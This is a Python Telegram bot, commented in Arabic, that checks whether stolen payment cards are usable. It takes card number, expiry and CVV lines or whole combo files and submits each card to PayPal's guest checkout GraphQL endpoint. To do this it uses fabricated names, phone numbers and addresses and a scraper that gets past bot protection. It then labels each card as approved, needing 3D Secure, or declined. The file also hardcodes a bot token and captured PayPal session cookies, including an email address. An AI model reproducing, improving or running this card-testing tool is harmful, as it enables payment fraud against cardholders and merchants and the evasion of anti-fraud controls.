import telebot
import requests
import time
import os
import re
import logging
import random
import string
import json
import cloudscraper

# إعداد السجلات
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# التوكن الجديد للبوت
TOKEN = '7803099267:AAFonfKn2Zbo0ENoSyzsk7Jp45KVM6uChfk'
bot = telebot.TeleBot(TOKEN)

# إنشاء سكرابر لتجاوز الحماية
scraper = cloudscraper.create_scraper()

def get_random_string(length):
    return ''.join(random.choices(string.ascii_lowercase, k=length))

def check_paypal_card(cc, mes, ano, cvv):
    # محاولة الفحص مرتين في حال حدوث Timeout
    for attempt in range(2):
        try:
            cookies = {
                'cookie_check': 'yes',
                'd_id': 'b9ce3d1e85714bb4b7453499cba9ef591769627904099',
                'TLTDID': '71779495171838788751565998725384',
                'sc_f': 'Zv03WKZI8zB_eipfYQREDMTlUXv8AQ-H0Om_ua0E6FrZJx8-Jtz4BTJN0Vqp9KcFVyvrgZ6DyB5434V4ci1CgZWbUFPwxx6ZS_L5aG',
                'cookie_prefs': 'T%3D1%2CP%3D1%2CF%3D1%2Ctype%3Dexplicit_banner',
                '_gcl_au': '1.1.336690973.1770157442',
                'pi_opt_in925803': 'true',
                'visitor_id925803-hash': 'c71c38a1309b3f313194278a6347ecc819e4ab22510a2460ee372c1fc54d0a69c2b56850ce5bc421fe66801dba76bb5bacd01db2',
                'visitor_id925803': '3906075122',
                'ui_experience': 'did_set%3Dtrue%26login_type%3DEMAIL_PASSWORD',
                'KHcl0EuY7AKSMgfvHl7J5E7hPtK': 'ROBW5ihGGt6_n_HUYdStHrIX1BKQ37LJO_a1-PqRSgfAPebpwsgAE2xiOFs5PWiYm8kqbg3VAJ6U2WTx',
                'navlns': '0.0',
                'consumer_display': 'USER_HOMEPAGE%3d0%26USER_TARGETPAGE%3d0%26USER_FILTER_CHOICE%3d0%26BALANCE_MODULE_STATE%3d1%26GIFT_BALANCE_MODULE_STATE%3d1%26LAST_SELECTED_ALIAS_ID%3d0%26SELLING_GROUP%3d1%26PAYMENT_AND_RISK_GROUP%3d1%26SHIPPING_GROUP%3d1%26HOME_VERSION%3d1770669270%26MCE2_ELIGIBILITY%3d4294967295',
                'enforce_policy': 'ccpa',
                'nav_prefs': 'regional_banner=1&1771878885509',
                'rmuc': 'RZYfBmjdYI3ib38J7Fb7eMPUI-pnBmBte_GQK06K0MujFzb3XK8Z4_f9iEVBEuJ0fSevo8vmZ6wQE7dovW8wqAenWR9uKSDO4XekwBJtnLXabq9FEIYa0u4sujdKKNQMLiS4xTvPlQa0pr6nAw6tW8LcezjZFnxrBTNTekfD99FB3hnP',
                'kndctr_5CE4123F5245B06C0A490D45_AdobeOrg_identity': 'CiY2ODQ2MTYxOTExMzY4NTI3Mjk2Njg3NzQxNjE5NjkyMzQ4NzA1MVIRCP6qsKDFMxgCKgRJUkwxMALwAfKJmrrGMw%3D%3D',
                'cf_clearance': 'BNRO9AspPdqL70FZG9FkpXpUv.cofHmrOf2ljRIHoIw-1771272792-1.2.1.1-xNWnbZKcLaAabSYncaERoRqzu4omUqmyf5iqngy_vx_ffuWjz66NxDw0JLMbshkz2Pzil02lb4SGk32Ddys1MBs3eL81f2RSt9KKHzABr7xp9bbi8zIjsP3Y33wQ..vVZlBaouxsybzfPeFLY4e1ix49kOE_a7h2pfb3BfSlelNk54QbEnSx4AlJ9Uj7AL_p0EdwhIksF0S4KS7NGo5Nle_NTrHzwa4vRzqqMT4.drI',
                '_iidt': 'oni/mBSuSUhsfTzNF3QSTqisLLPN9Wp0fW+2aj4VGNXkCh7qrrgtescvFe+YE2Ngsg6UvFvxtM2iKw==',
                'login_email': 'gftikvf%40gmail.com',
                '_gid': 'GA1.2.465036676.1775080845',
                'ts_c': 'vr%3D060ae6d619c0ad10a08944f2ffe0e1dd%26vt%3D4d8f822d19d647e10420a581ffcde538',
                'LANG': 'en_US%3BUS',
                'datadome': 'zlclQASF8Vnk~Ys3zHc6JS8tYzJYnaviKE3aaLZh~WhUpBPre38SPzQZ1ZiwevYZdzQqs4OTtdW1fnee74Cx8ttJSr8mSi~byHMzH5QhRKgliKrwjqrz7yvZSrJ_TTZQ',
                '_ga_FQYH6BLY4K': 'GS1.1.1775123103.1.0.1775123103.0.0.0',
                '_ga': 'GA1.2.1456745267.1770157443',
                'nsid': 's%3AwU-hly7G6096_gKRlYi3K7PQxsMgPs7L.9qWZTsPSNFowNliP3FepKYQC2qpBVjQXxkwFbYSRykw',
                'rssk': 'd%7DC9%40%3D86786A8%3F%3C8%3Exqx%3EBtv%C2%82%3Eh%7Fg%3F15',
                'ddi': 'kgvaSCQfXStXiBPtRh93d1DCw47lD1DaZm0V3laaPDNpI0WDDiWICOJZsmORsYj8W_MM-vJ9OQOpJB06dtCFgv33bu6dUsVD0lxnd97YgRpE18Vm',
                'l7_az': 'dcg14.slc',
                'AV894Kt2TSumQQrJwe-8mzmyREO': 'S23AANn-3TXh6ONwMPGoFb--jDiFgu8Be-aT19uXYgp-_7Nj4sxQdBxHxnIUQ-gC3JNI-cOUjM4nI_IHJf7eV_q8mGcWVi2wg',
                'tsrce': 'standardcardfields',
                'x-pp-s': 'eyJ0IjoiMTc3NTEyNDY2MjkxMiIsImwiOiIwIiwibSI6IjAifQ',
                'ts': 'vreXpYrS%3D1806660662%26vteXpYrS%3D1775126462%26vr%3D060ae6d619c0ad10a08944f2ffe0e1dd%26vt%3D4d8f822d19d647e10420a581ffcde538%26vtyp%3Dreturn',
                '_dd_s': 'aid=rpy3g56v9h&rum=2&id=b6308e25-e4cf-4d33-bfd7-10fc36a39f96&created=1775124565208&expire=1775125571404',
            }

            headers = {
                'authority': 'www.paypal.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/json',
                'origin': 'https://www.paypal.com',
                'referer': 'https://www.paypal.com/smart/card-fields',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
                'x-app-name': 'standardcardfields',
                'x-country': 'US',
            }

            card_type = "VISA" if cc.startswith('4') else "MASTER_CARD" if cc.startswith('5') else "AMEX" if cc.startswith('3') else "DISCOVER"
            f_name = get_random_string(5).capitalize()
            l_name = get_random_string(5).capitalize()
            address_data = {
                'givenName': f_name,
                'familyName': l_name,
                'line1': '123 Broadway, Apt 5B',
                'city': 'New York',
                'state': 'NY',
                'postalCode': '10007',
                'country': 'US',
            }

            json_data = {
                'query': '\n        mutation payWithCard(\n            $token: String!\n            $card: CardInput\n            $paymentToken: String\n            $phoneNumber: String\n            $firstName: String\n            $lastName: String\n            $shippingAddress: AddressInput\n            $billingAddress: AddressInput\n            $email: String\n            $currencyConversionType: CheckoutCurrencyConversionType\n            $installmentTerm: Int\n            $identityDocument: IdentityDocumentInput\n            $feeReferenceId: String\n        ) {\n            approveGuestPaymentWithCreditCard(\n                token: $token\n                card: $card\n                paymentToken: $paymentToken\n                phoneNumber: $phoneNumber\n                firstName: $firstName\n                lastName: $lastName\n                email: $email\n                shippingAddress: $shippingAddress\n                billingAddress: $billingAddress\n                currencyConversionType: $currencyConversionType\n                installmentTerm: $installmentTerm\n                identityDocument: $identityDocument\n                feeReferenceId: $feeReferenceId\n            ) {\n                flags {\n                    is3DSecureRequired\n                }\n                cart {\n                    intent\n                    cartId\n                }\n            }\n        }\n        ',
                'variables': {
                    'token': '7NR948574A109164T',
                    'card': {
                        'cardNumber': cc,
                        'type': card_type,
                        'expirationDate': f"{mes}/{ano}",
                        'postalCode': '10007',
                        'securityCode': cvv,
                    },
                    'phoneNumber': '773' + ''.join(random.choices(string.digits, k=7)),
                    'firstName': f_name,
                    'lastName': l_name,
                    'billingAddress': address_data,
                    'shippingAddress': address_data,
                    'email': get_random_string(8) + '@gmail.com',
                    'currencyConversionType': 'VENDOR',
                },
            }

            # فرض وقت انتظار 60 ثانية
            response = scraper.post(
                'https://www.paypal.com/graphql?fetch_credit_form_submit',
                cookies=cookies,
                headers=headers,
                json=json_data,
                timeout=60
            )
            
            res_text = response.text
            logging.info(f"Response for {cc}: {res_text}")

            if "approveGuestPaymentWithCreditCard" in res_text and "cartId" in res_text:
                return "🔥 Charge / Approved"
            elif "is3DSecureRequired" in res_text:
                return "🟡 3DS Required"
            else:
                return "❌ ORDER NOT APPROVED"
                
        except Exception as e:
            logging.error(f"Attempt {attempt+1} error for {cc}: {e}")
            if attempt == 1:
                return "❌ ORDER NOT APPROVED"
            time.sleep(3)
            
    return "❌ ORDER NOT APPROVED"

def format_cc_result(cc, mes, ano, cvv, status):
    msg = f"━━━━━━━━━━━━━━━━━━━━\n"
    msg += f"💳 **PayPal Gateway Check** 💳\n"
    msg += f"━━━━━━━━━━━━━━━━━━━━\n"
    msg += f"📍 **CC:** `{cc}|{mes}|{ano}|{cvv}`\n"
    msg += f"💠 **Status:** {status}\n"
    msg += f"━━━━━━━━━━━━━━━━━━━━\n"
    return msg

@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "👋 أهلاً بك في بوت فحص PayPal (النسخة النهائية المستقرة)!\n\nأرسل الكومبو (CC|MES|ANO|CVV) أو ارفع ملف .txt للفحص.")

@bot.message_handler(func=lambda message: True)
def handle_text(message):
    lines = message.text.split('\n')
    for line in lines:
        line = line.strip()
        if not line: continue
        
        match = re.search(r'(\d{15,16})[|/: ](\d{1,2})[|/: ](\d{2,4})[|/: ](\d{3,4})', line)
        if match:
            cc, mes, ano, cvv = match.groups()
            if len(ano) == 2: ano = "20" + ano
            if len(mes) == 1: mes = "0" + mes
            
            msg = bot.reply_to(message, "🔍 جاري الفحص...")
            status = check_paypal_card(cc, mes, ano, cvv)
            bot.edit_message_text(format_cc_result(cc, mes, ano, cvv, status), message.chat.id, msg.message_id, parse_mode='Markdown')
        else:
            bot.reply_to(message, f"❌ صيغة خاطئة: {line}")

@bot.message_handler(content_types=['document'])
def handle_document(message):
    if message.document.file_name.endswith('.txt'):
        file_info = bot.get_file(message.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        lines = downloaded_file.decode('utf-8').split('\n')
        status_msg = bot.reply_to(message, f"📥 جاري فحص {len(lines)} بطاقة...")
        
        results = []
        for i, line in enumerate(lines):
            match = re.search(r'(\d{15,16})[|/: ](\d{1,2})[|/: ](\d{2,4})[|/: ](\d{3,4})', line)
            if match:
                cc, mes, ano, cvv = match.groups()
                if len(ano) == 2: ano = "20" + ano
                if len(mes) == 1: mes = "0" + mes
                status = check_paypal_card(cc, mes, ano, cvv)
                results.append(f"🔹 `{cc}|{mes}|{ano}|{cvv}` -> {status}")
                
                if (i + 1) % 5 == 0:
                    try: bot.edit_message_text(f"⏳ فحص: {i+1}/{len(lines)}", message.chat.id, status_msg.message_id)
                    except: pass
            
        output = "📊 **نتائج فحص الملف:**\n\n" + "\n".join(results)
        if len(output) > 4000:
            with open("cc_results.txt", "w") as f: f.write(output)
            with open("cc_results.txt", "rb") as f: bot.send_document(message.chat.id, f)
        else:
            bot.edit_message_text(output, message.chat.id, status_msg.message_id, parse_mode='Markdown')
    else:
        bot.reply_to(message, "⚠️ يرجى رفع ملف .txt")

if __name__ == "__main__":
    print("Bot is starting...")
    bot.infinity_polling()
